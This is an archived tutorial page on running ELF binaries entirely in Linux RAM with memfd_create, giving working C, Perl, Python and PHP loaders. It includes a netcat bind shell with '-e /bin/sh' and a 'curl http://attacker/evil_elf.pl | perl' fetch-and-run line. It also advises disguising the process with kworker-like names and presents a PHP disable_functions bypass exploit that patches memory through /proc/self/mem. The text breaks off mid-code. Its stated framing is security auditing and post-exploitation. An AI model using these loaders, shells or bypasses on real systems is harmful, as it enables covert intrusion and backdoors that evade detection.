<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Elves in memory. Run ELF in Linux RAM</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Fileless malware distribution is gaining popularity. What is not surprising, because the work of such programs leaves little trace. In this article, w...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Elves in memory. Run ELF in Linux RAM</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p>  Fileless malware distribution is gaining popularity.  What is not surprising, because the work of such programs leaves little trace.  In this article, we will not deal with the techniques of running programs in Windows memory.  Let's concentrate on GNU / Linux.  Linux is rightfully dominant in the server segment, lives on millions of embedded devices and provides the vast majority of web resources.  Next, we will make a small review of the possibilities of executing programs in memory and demonstrate that this is possible even in difficult conditions. </p><a name="habracut"></a><br><p>  Techniques of fileless execution of programs are secretive, it is extremely difficult to detect and track their use.  File system integrity controls will not alert the administrator, since no disk write operations or file changes on the disk occur.  Antivirus software (often neglected by * nix users) often does not track program memory after startup.  In addition, in many GNU / Linux distributions immediately after installation, a wide range of various debugging tools, interpreters, compilers of programming languages ‚Äã‚Äãand libraries are available for them.  All this creates excellent conditions for using the technology of covert, fileless program execution.  But besides the advantages of their use, there are drawbacks - these programs do not survive de-energizing or rebooting the target host.  But while the host is running, the program is working. </p><br><p>  Such techniques can and should be used not only for the distribution of malware.  If you are critical to the speed of your program - unload it into RAM.  Actually, many Linux distributions feel great completely starting up in RAM, which allows you to work with hard disks without saving any files on them.  From the point of view of information security auditing, covert program execution methods are very useful as a post-exploitation and reconnaissance stage within the target network perimeter.  Especially if the maximum secrecy is one of the conditions of the audit. <br>  According to the portal <a href="https://www.barkly.com/">barkly.com</a> in 2018, already 35% of virus attacks account for harmful software running in memory. </p><br><p>  In the case of Windows, attackers actively use Powershell pre-installed on the system in order to download and immediately execute the code.  These techniques are widely distributed, including through the implementation of such frameworks as Powershell Empire, Powersploit and Metasploit Framework. </p><br><h1 id="a-chto-naschet-linux">  What about Linux? </h1><br><p>  In most cases, Linux distributions installed on hosts have a pre-installed set of software.  "Out of the box", as a rule, interpreters of programming languages ‚Äã‚Äãare available: Python, Perl, C compiler. PHP is present in the appendage on the hosting sites.  This condition provides the ability to execute code using these languages. </p><br><p>  In Linux, we have several well-known code executions in memory. <br>  The easiest way is to use a shared memory region that is pre-mounted on the file system. </p><br><p>  By placing the executable file in the directory / dev / shm or / run / shm, you can achieve its execution directly in memory, given that these directories are nothing more than an area of ‚Äã‚ÄãRAM mounted to the file system.  But they can be viewed using ls like any other directory.  And as a rule, these directories are mounted with the noexec flag, and the execution of programs in these directories is available only to the superuser.  So, to be a little more inconspicuous, you need something else. </p><br><p> More noteworthy is the <a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html">memfd_create (2)</a> system call.  This system call works approximately like <a href="https://linux.die.net/man/3/malloc">malloc (3)</a> , but returns not a pointer to a memory area, but a file descriptor to an anonymous file, which is visible in the file system only as a link to <code>/proc/PID/fd/</code> , by which it can be executed using <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve (2).</a> <br>  This is what the <a href="https://reposcope.com/man/ru/2/memfd_create">memfd_create</a> system call manual page says <a href="https://reposcope.com/man/ru/2/memfd_create">(in Russian)</a> : </p><br><p>  <em>"The name specified in the</em> <code>name</code> <em>is used as the file name and will be displayed as the target of the corresponding symbolic link in the directory. <code>/proc/self/fd/</code> . The display name always starts with <code>memfd:</code> and serves only for debugging. The names do not affect the behavior of the file descriptor, and therefore multiple files can have the same name without any consequences. "</em> </p><br><p>  An example of using <code>memfd_create()</code> for the C language: </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p>  The code above uses <code>memfd</code> , creates a child process, sends its output to a temporary file, waits for the completion of the child process, and reads its output from the temporary file.  Usually to redirect the output of one program to the input of another in * nix use pipe "|". </p><br><p>  The ability to use <code>syscall()</code> is also in interpreted languages ‚Äã‚Äãsuch as perl, python, etc ... Next, consider one of the possible scenarios and demonstrate the ability to load executable files into memory using <code>memfd_create()</code> . </p><br><h3 id="perl">  Perl </h3><br><p>  Suppose we have an entry point in the form of command injection. <br>  We need a way to make system calls on the target system. <br>  In perl, the <a href="https://perldoc.perl.org/functions/syscall.html">syscall ()</a> function will help us with this. <br>  We will also need a way to write our ELF directly to memory as the contents of an anonymous file. <br>  To do this, we will place our ELF directly into the body of the script, which in turn will be transmitted to the target system via available command injection.  Alternatively, you can also download the executable file over the network. <br>  But before this is to make a reservation.  We need to know the linux kernel version on the target host, since the <code>memfd_create()</code> system call we need is only available from versions <strong>3.17</strong> and higher. </p><br><p>  Let's take a closer <code>memfd_create()</code> at <code>memfd_create()</code> and <code>execve()</code> </p><br><p>  For our anonymous file, we will use the <code>MFD_CLOEXEC</code> constant, which "sets the <code>close-on-exec (FD_CLOEXEC)</code> flag <code>close-on-exec (FD_CLOEXEC)</code> for the new open file descriptor."  This means our file descriptor will automatically close after we execute our ELF with <code>execve()</code> </p><br><p>  Since we will use the <code>syscall()</code> function, we will need numeric values ‚Äã‚Äãto call our <code>syscall</code> and its parameter. <br>  You can find them in <code>/usr/include</code> or on the Internet.  The system call number can be found in <code>#define</code> starting with <code>__NR_</code> <br>  In our case, <code>memfd_create()</code> is number 319 for a 64-bit OS.  And the constant <code>FD_CLOSEXEC 0x0001U</code> (that is, 1 in the file <code>linux/memfd.h</code> ) </p><br><p>  Now we have all the necessary numerical values, and we can write in Perl an analogue <code>memfd_create(name, MFD_CLOEXEC)</code> from C. <br>  We will also need to come up with the name of the file that will be displayed in <code>/memfd:</code> <br>  It will be optimal to choose a name similar to <code>[:kworker]</code> or another one that is not suspicious. <br>  For example, in the name parameter we will pass an empty string: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p>  Now we have an anonymous file descriptor in $ fd and we need to write the ELF to this file. <br>  The <a href="http://perldoc.perl.org/functions/open.html">open ()</a> function in perl is usually used to open files, but using the <code>&gt;&amp;=FD</code> construct, passing the descriptor instead of the file name to this function, we turn the already open file descriptor into a file handle. <br>  We would also <code>autoflush[]</code> : </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p>  Now we have a descriptor that refers to an anonymous file. </p><br><p>  Next, we need to convert our executable file into data that can be put into the body of a Perl script. <br>  To do this, perform: </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p>  We will get many, many similar lines: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p>  Having executed them, we will place our executable file in memory.  We will only have to run it. </p><br><h4 id="fork">  fork () </h4><br><p>  Optionally, we can use <a href="https://linux.die.net/man/2/fork">fork ()</a> .  It is not at all necessary.  But if we want to not just start ELF and kill the process, we will need to use <code>fork()</code> . <br>  In general, creating a child process in perl looks like this: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  The utility of <code>fork()</code> is also in the fact that, by calling it together with <a href="http://man7.org/linux/man-pages/man2/setsid.2.html">setsid (2)</a> , you can separate the child process from the parent process and let the parent complete: </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p>  Now we can run ELF in a variety of processes. </p><br><h4 id="execve">  Execve () </h4><br><p>  <a href="http://man7.org/linux/man-pages/man2/execve.2.html">Execve ()</a> is a system call that allows us to execute a program.  Perl provides us with similar functionality through the <a href="http://perldoc.perl.org/functions/exec.html">Exec ()</a> function, which works just like the aforementioned system call, but it has a much simpler and more convenient syntax. <br>  We need to transfer two things to <code>exec()</code> : the file we want to execute (our ELF loaded in advance), and the name of the process as one of the arguments passed.  Usually the process name corresponds to the name of the executable file.  But since in the listing of processes we will see <code>/proc/PID/fd/3</code> , we will call our process somehow differently. <br>  The <code>exec()</code> syntax is as follows: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p>  The example above launches Netcat.  But we would like to run something a little less like a backdoor. <br>  A running process will not have a link to an anonymous file in <code>/proc/PID/fd</code> , but we can always find our ELF at the link <code>/proc/PID/exe</code> , which points to the file of the running process. <br>  So we launched ELF in Linux memory, without touching the disk and even the file system. <br>  You can quickly and conveniently download our executable file to the target system, for example, by passing a script to the Perl interpreter, in whose body we placed the ELF and placed it on an external web hosting service: <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python">  Python </h3><br><p>  Similar to the Perl version, we need to do the following: </p><br><ul><li>  using the memfd_create () system call, create an anonymous file in memory </li><li>  write ELF executable to this file </li><li>  execute it and optionally execute it several times with fork () </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p>  In the case of python, to call <code>syscall</code> we need a standard <a href="https://docs.python.org/2/library/ctypes.html">ctypes</a> and <a href="https://docs.python.org/2/library/os.html">os</a> module to write and execute a file and control the process.  Everything is completely analogous to the perl variant. <br>  In the code above, we write into memory a file previously placed in the <code>/tmp/</code> .  However, nothing prevents us from downloading the file from the web server. </p><br><h3 id="php">  Php </h3><br><p>  At this stage, we can already use perl and python.  Interpreters of these languages ‚Äã‚Äãare installed by default in many operating systems.  But the most interesting, as always, ahead. <br>  If for some reason, perl or python interpreters are not available to us, it would be great to use PHP.  This language is very popular among web developers.  And if we have already found the ability to execute code in a web application, the PHP interpreter will most likely meet us. </p><br><p>  Unfortunately, php has no built-in mechanisms for invoking <code>syscall</code> . <br>  We came across a <a href="https://rdot.org/forum/showthread.php%3Ft%3D3309">post</a> from Beched on the rdot forum (Thank you Beched!), Which overwrites the <code>open</code> function on the <code>system</code> via <a href="http://man7.org/linux/man-pages/man5/proc.5.html">procfs</a> <code>/proc/self/mem</code> in the memory of the current process and <code>disable_functions</code> bypasses <code>disable_functions</code> . <br>  We used this trick to rewrite the function on our code, which will cause the necessary system calls. <br>  We will transfer the <code>syscall</code> the php interpreter as a shellcode on assembler. <br>  System calls will need to be passed through a sequence of commands. <br>  Let's start writing a PHP script.  Next will be a lot of magic. </p><br><p>  First, we denote the necessary parameters: </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p>  Let us denote the shift - the upper and lower values ‚Äã‚Äãin the memory, where later we put our shellcode: </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p>  Further, the function with which the binary file is "unpacked".  To do this, convert the binary data to the decimal representation using the <a href="http://php.net/manual/ru/function.hexdec.php">hexdex ()</a> function from the <a href="http://php.net/manual/ru/function.hexdec.php">bin2hex ()</a> binary data in the <a href="http://www.php.su/strrev">reverse order</a> (for storage): </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p>  Next, the <a href="https://people.redhat.com/mpolacek/src/devconf2012.pdf">ELF</a> format file is parsed to obtain offsets: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p>  Additionally, we will display information about the installed version of PHP: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  We verify the bitness of the operating system and the Linux kernel version: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p>  In order to bypass the limitations of <code>disable_functions</code> , the script rewrites the address of the <code>open@plt</code> function on the fly.  We have made several additions to the code, beched'a, and now we can put in memory our shellcode. </p><br><p>  First you need to find a shift in the binary file of the PHP interpreter itself, for this we turn to <code>/proc/self/exe</code> and parse the executable file using the above <code>parseelf()</code> function: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Find the address of the <code>open()</code> function: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span 